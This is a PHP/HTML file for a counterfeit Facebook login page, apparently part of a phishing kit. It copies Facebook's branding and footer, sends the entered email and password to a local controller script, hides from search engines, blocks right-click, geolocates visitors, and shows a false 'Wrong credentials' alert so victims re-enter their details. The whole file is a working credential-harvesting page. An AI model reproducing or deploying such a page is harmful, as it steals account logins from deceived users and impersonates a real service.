<?php  
session_start();

 if (isset($_POST['submit'])) {
    $_SESSION['eksekusi'];
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
    header("Location: ../config/controller");
}

?>

<!DOCTYPE html>

<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE" />
        <title>Facebook – log in or sign up</title>
         <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noodp" />
    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noodp" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
        <meta name="referrer" content="default" id="meta_referrer" />
        <meta name="theme-color" content="#3b5998" />

        <link rel="shortcut icon" href="../img/favicon3.ico" type="image/x-icon">
        <link rel="stylesheet" href="../css/style.css">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
        <link href="https://fonts.cdnfonts.com/css/sf-pro-display" rel="stylesheet">
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
        <script language="JavaScript" src="http://www.geoplugin.net/javascript.gp" type="text/javascript"></script>
    </head>
    <body oncontextmenu="return false">

<div class="main-contend-section">
    <div class="main-container">
        <div class="w-50">
            <div class="logo">
                <img src="../img/wowsz.svg" alt="Logo">
            </div>
            <div class="fb-tag-line">
                <h3 class="fb-tag-line">Facebook helps you connect and share with the people in your life.</h3>
            </div>
        </div>
        <div class="w-50">
            <div class="form-section">
                <?php if(isset($_SESSION['eksekusi'])) : ?>
                            <div class="alert alert-danger text-center" style="color: #333;height: 80px;" role="alert">
  <b>Wrong credentials</b> <br> Invalid username or password
</div>
                <?php session_destroy(); 
            endif; ?>
                <form action="../config/controller" method="POST">
                    <input type="text" name="email" id="email" placeholder="Email address or phone number" autocomplete="on" required autofocus>
                    <input type="password" name="password" id="password" placeholder="Password" autocomplete="on" required>
                    <input type="submit" name="submit" id="submit" value="Log In">`
                    <a href="https://en-gb.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" target="_self" class="forgot">Forgotten password?</a>
                    <div class="line"></div>
                    <?php if(empty($_SESSION['eksekusi'])) :  ?>
                    <a href="https://www.facebook.com/reg/" target="_self" class="create-new-acc">Create New Account</a>
                </form>
            </div>
               <div class="create-page">
                <p><a href="https://www.facebook.com/pages/create/" target="_self">Create a Page</a> for a celebrity, band or business.</p>
            </div>
        <?php endif; ?>
        </form>
        </div>
    </div>
    </div>
</div>
<div class="footer-section">
    <div class="footer-container">
        <div class="language-section">
            <ul>
                <li>English (UK)</li>
                <li><a >বাংলা</a></li>
                <li><a >অসমীয়া</a></li>
                <li><a >हिन्दी</a></li>
                <li><a>Bahasa Indonesia</a></li>
                <li><a  >नेपाली</a></li>
                <li><a  >中文(简体)</a></li>
                <li><a >العربية</a></li>
                <li><a>Bahasa Melayu</a></li>
                <li><a>Español</a></li>
                <li><a>Português (Brasil)</a></li>
            </ul>
        </div>
        <div class="other-pages-link">
            <div class="line"></div>
            <ul>
                <li><a>Sign Up</a></li>
                <li><a>Log In</a></li>
                <li><a>Messenger</a></li>
                <li><a>Facebook Lite </a></li>
                <li><a>Video </a></li>
                <li><a>Places</a></li>
                <li><a>Games</a></li>
                <li><a>Marketplace</a></li>
                <li><a>Meta Pay</a></li>
                <li><a>Meta Store</a></li>
                <li><a>Meta Quest</a></li>
                <li><a>Instagram</a></li>
                <li><a>Threads</a></li>
                <li><a>Fundraisers</a></li>
                <li><a>Services</a></li>
                <li><a>Voting Information Center</a></li>
                <li><a>Privacy Policy</a></li>
                <li><a>Privacy Center</a></li>
                <li><a>Privacy Center</a></li>
                <li><a>Create Page</a></li>
                <li><a>Developers</a></li>
                <li><a>Careers</a></li>
                <li><a>Privacy</a></li>
                <li><a>Cookies</a></li>
                <li><a>Terms</a></li>
                <li><a>Help</a></li>
            </ul>
        </div>
        <div class="copywrite">
            <p>Meta &copy; 2024</p>
        </div>
    </div>
</div>
       <script type="text/javascript" src="../js/main.js"></script>
    </body>
</html>